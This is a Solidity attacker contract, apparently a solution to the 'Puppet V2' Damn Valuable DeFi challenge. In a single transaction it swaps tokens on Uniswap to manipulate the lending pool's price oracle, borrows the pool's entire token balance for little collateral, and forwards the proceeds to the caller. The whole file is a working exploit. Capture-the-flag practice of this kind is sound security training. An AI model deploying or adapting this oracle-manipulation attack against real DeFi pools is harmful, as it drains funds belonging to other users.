// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {WETH} from "solmate/src/tokens/WETH.sol";

import {IDamnValuableToken} from "./IDamnValuableToken.sol";
import {IPuppetV2Pool} from "./IPuppetV2Pool.sol";
import {IUniswapV2Router02} from "./IUniswapV2Router02.sol";

contract PuppetV2PoolAttacker {
    error SendEthFailed();

    constructor(
        address _puppetPool,
        address _uniRouter,
        address payable _weth,
        address _dvt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) payable {
        // 1. Initialise recurrent interfaces
        IPuppetV2Pool puppetPool = IPuppetV2Pool(_puppetPool);
        WETH weth = WETH(_weth);
        IDamnValuableToken dvt = IDamnValuableToken(_dvt);
        IUniswapV2Router02 uniRouter = IUniswapV2Router02(_uniRouter);

        // 2. It is required to leverage `EIP-2612` (i.e. `ERC20Permit`) to pass the challenge with a single tx (rather
        // than `ERC20.approve()` + `ERC20.transferFrom()`). Make sure this contract has the DVT allowance set to max.
        dvt.permit(
            msg.sender,
            address(this),
            type(uint256).max,
            type(uint256).max,
            _v,
            _r,
            _s
        );

        // 3. Transfer all DVTs here and swap them for ETH
        uint256 senderDvtBalance = dvt.balanceOf(msg.sender);
        dvt.transferFrom(msg.sender, address(this), senderDvtBalance);
        dvt.approve(_uniRouter, senderDvtBalance);
        address[] memory path = new address[](2);
        path[0] = _dvt;
        path[1] = _weth;
        uniRouter.swapExactTokensForETH(
            senderDvtBalance,
            0,
            path,
            address(this),
            type(uint256).max
        );

        // 4. Calculate how much ETH is necessary to leave as collateral to borrow all lending pool DVTs
        uint256 lenderPoolDvtBalance = dvt.balanceOf(_puppetPool);
        uint256 wethAmount = puppetPool.calculateDepositOfWETHRequired(
            lenderPoolDvtBalance
        );

        // 5. Wrap the required ETH and borrow all the DVT
        weth.deposit{value: wethAmount}();
        weth.approve(_puppetPool, wethAmount);
        puppetPool.borrow(lenderPoolDvtBalance);

        // 6. Transfer all the DVT and ETH to the signer
        dvt.transfer(msg.sender, dvt.balanceOf(address(this)));
        (bool success, ) = address(msg.sender).call{
            value: address(this).balance
        }("");
        if (!success) {
            revert SendEthFailed();
        }
    }
}
